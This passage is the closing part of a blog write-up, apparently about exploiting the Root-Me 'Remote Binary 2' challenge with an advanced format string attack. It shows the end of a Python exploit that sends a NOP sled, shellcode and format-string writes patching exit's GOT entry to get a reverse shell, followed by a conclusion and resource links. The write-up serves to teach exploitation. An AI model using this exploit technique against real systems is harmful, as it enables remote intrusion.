</span><span class="n">nopsled</span> <span class="o">=</span> <span class="mi">100</span> <span class="o">*</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span>
<span class="n">fmt_write_ssock</span> <span class="o">+=</span> <span class="n">nopsled</span> <span class="o">+</span> <span class="n">payload</span>
<span class="k">print</span> <span class="s">'    {0}'</span><span class="o">.</span><span class="nb">format</span> <span class="p">(</span><span class="n">fmt_write_ssock</span><span class="p">)</span>

<span class="c1"># format string write
# payload + format will patch ssock to cause accept to fail, exit and go to our shellcode
</span><span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
    <span class="k">print</span> <span class="s">'[+] Patching exit.got function pointer'</span>
    <span class="n">csock</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">connect</span> <span class="p">(</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span> <span class="n">fmt_write_got</span> <span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>

    <span class="k">print</span> <span class="s">'[+] Triggering payload!!!'</span>
    <span class="n">csock</span> <span class="o">=</span> <span class="n">socket</span> <span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">connect</span> <span class="p">(</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span> <span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span> <span class="n">fmt_write_ssock</span> <span class="p">)</span>
    <span class="n">csock</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>

    <span class="k">print</span> <span class="s">'[+] You should have gotten a reverse shell, if not, the exploit failed'</span>

<span class="k">print</span> <span class="s">'Bye'</span></pre></td></tr></tbody></table></code></pre></figure>

<h2 id="conclusion">Conclusion</h2>

<p>As you could see, as always, with dedication come the prize: a full reliable
remote exploit for rbinary2.</p>

<p>Anyhow, this post was to illustrate how we can make use of infoleak
for bettering the reliability of an exploit.</p>

<p>In this case, if ASLR+DEP+Full PIE were to be activated, it would still
be exploitable thanks to the infoleak. This is left as an exercise to
the readers.</p>

<p>For those wanting to train more, you could also bruteforce the format string
stack pointer offset remotely and completely automate the format string
construction.</p>

<p>And also, I’ve heard multiple times: this paper is so ooold, useless!</p>

<p>It’s old sure, but the more techniques you have in your bag, the more you will
be prepared. We never know, sometime old and simple techniques are
the most efficient to use.</p>

<p>I hope you enjoyed this article,</p>

<p>Cheers,</p>

<p>m_101</p>

<h1 id="resources">Resources</h1>

<ul>
  <li>The challenge:
<a href="http://www.root-me.org/fr/Challenges/App-Systeme/Remote-binary-2">Remote Binary 2</a></li>
  <li>The bible on format string exploitation:
<a href="http://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf">Format Strings by TESO</a></li>
  <li><a href="/binholic/assets/others/rbin2.py">The exploit</a></li>
</ul>


  </div>

  <div class="post-navigation">
    
    <a class="post-prev" href="/binholic/2013/06/10/vanilla1-write-what-where-exploitation.html">Previous : Vanilla1 : write-what-where exploitation (ASLR, Full RELRO, Stack cookie)</a>
    

    
    <a class="post-next" href="/binholic/2013/12/13/lfi-exploitation-basics-code-execution.html">Next : LFI Exploitation : Basics, code execution and information leak</a>
    
  </div>

  
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function () {
            this.page.url = "http://binholic.com/2013/08/20/root-me-remote-binary-2-advanced-format-string.html";
            this.page.identifier = "/2013/08/20/root-me-remote-binary-2-advanced-format-string";
        };

        (function() { // DON'T EDIT BELOW THIS LINE
            var d = document, s = d.createElement('script');

            s.src = '//binholic.disqus.com/embed.js';

            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
  

</article>

      </div>
    </div>

    <footer class="site-footer">

  <div class="wrapper">

      <div class="site-footer">
        <ul class="social-media-list">
          
          <li>
            <a href="https://github.com/m101"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="https://twitter.com/w_levin"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
</span></a>

          </li>
          

          
          <li>
            <a href="mailto:m101.sec@gmail.com"><span class="icon icon--email"><?xml version="1.0" encoding="UTF-8"?>
<!-- Generator: Adobe Illustrator 16.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="240.665px" height="250px" viewBox="43.833 205.167 240.665 250" enable-background="new 43.833 205.167 240.665 250" xml:space="preserve">
<g>
	<path fill="#323232" d="M221.459,396.62c-8.84,0-15.904-2.21-21.191-6.63c-5.289-4.42-8.449-10.441-9.488-18.07   c-4.855,5.895-10.66,10.965-17.42,15.21c-6.762,4.249-14.561,6.37-23.4,6.37c-6.59,0-12.83-1.256-18.72-3.77   c-5.895-2.512-11.095-6.15-15.6-10.92c-4.509-4.766-8.105-10.571-10.79-17.42c-2.689-6.846-4.03-14.69-4.03-23.531   c0-9.879,1.56-19.064,4.68-27.56c3.12-8.49,7.365-15.86,12.74-22.1c5.371-6.24,11.7-11.136,18.98-14.69   c7.28-3.551,15.08-5.33,23.4-5.33c9.01,0,16.68,1.82,23.01,5.461c6.324,3.639,11.311,8.234,14.949,13.779l2.34-17.42h20.541   l-10.66,85.02c-0.52,3.99-0.781,7.021-0.781,9.101c0,5.029,1.041,8.929,3.121,11.7c2.08,2.774,5.545,4.16,10.4,4.16   c4.504,0,8.84-1.646,13-4.94c4.16-3.29,7.799-7.931,10.92-13.91c3.119-5.979,5.589-13.085,7.41-21.319   c1.82-8.23,2.729-17.291,2.729-27.17c0-11.961-2.123-23.051-6.369-33.281c-4.25-10.225-10.228-19.064-17.939-26.52   c-7.715-7.451-16.859-13.26-27.43-17.42c-10.576-4.16-22.189-6.24-34.842-6.24c-16.119,0-30.464,3.165-43.029,9.49   c-12.57,6.33-23.14,14.605-31.72,24.83c-8.58,10.229-15.08,21.799-19.5,34.71c-4.42,12.915-6.63,26.045-6.63,39.39   c0,15.08,2.34,28.516,7.02,40.301c4.68,11.789,11.18,21.795,19.5,30.029c8.32,8.23,18.11,14.471,29.38,18.721   c11.265,4.244,23.485,6.369,36.661,6.369c13.17,0,24.914-1.561,35.229-4.68c10.311-3.121,20.15-6.936,29.512-11.439l7.539,19.76   c-9.016,4.85-19.891,8.924-32.631,12.219c-12.738,3.291-26.479,4.941-41.209,4.941c-16.64,0-31.98-2.516-46.02-7.541   c-14.04-5.029-26.175-12.439-36.4-22.23c-10.229-9.795-18.2-21.84-23.92-36.139c-5.72-14.301-8.58-30.811-8.58-49.53   c0-17.331,2.99-33.841,8.97-49.53c5.98-15.686,14.471-29.51,25.48-41.47c11.005-11.96,24.266-21.45,39.78-28.47   c15.51-7.02,32.889-10.53,52.129-10.53c16.291,0,31.156,2.645,44.59,7.93c13.432,5.29,24.916,12.524,34.451,21.71   c9.529,9.189,16.898,20.064,22.1,32.63c5.199,12.568,7.799,26.129,7.799,40.689c0,12.48-1.518,23.965-4.549,34.45   c-3.035,10.489-7.195,19.5-12.48,27.04c-5.289,7.54-11.615,13.391-18.98,17.55C238.139,394.54,230.124,396.62,221.459,396.62z    M156.979,374.26c6.76,0,13-1.86,18.721-5.59c5.719-3.725,10.311-7.756,13.779-12.09l6.24-51.48   c-3.469-5.545-7.975-10.051-13.52-13.52c-5.551-3.465-11.875-5.2-18.98-5.2c-5.201,0-10.23,1.17-15.08,3.511   c-4.855,2.34-9.145,5.635-12.87,9.879c-3.729,4.25-6.675,9.32-8.84,15.211c-2.169,5.895-3.25,12.395-3.25,19.5   c0,13.174,3.291,23.1,9.88,29.77C139.645,370.925,147.62,374.26,156.979,374.26z"/>
</g>
</svg></span></a>

          </li>
          

          
          <li>
            <a href="http://127.0.0.1:8888/USK@ABR8mm2t1L1G8cBG70cDy4PHFO6LPV~LrA-RIZxgOGI,pnGWUxb7k8~5-ywwqnBakTXx5ZFw6QzzZj7H~45NgE8,AQACAAE/binholic/-1/"><span class="icon icon--freenet"><?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Created with Inkscape (http://www.inkscape.org/) -->
<svg
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   version="1.0"
   width="79.12"
   height="52.64">
  <defs/>
  <g
     transform="translate(-47.495719,-111.30691)">
    <path
       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
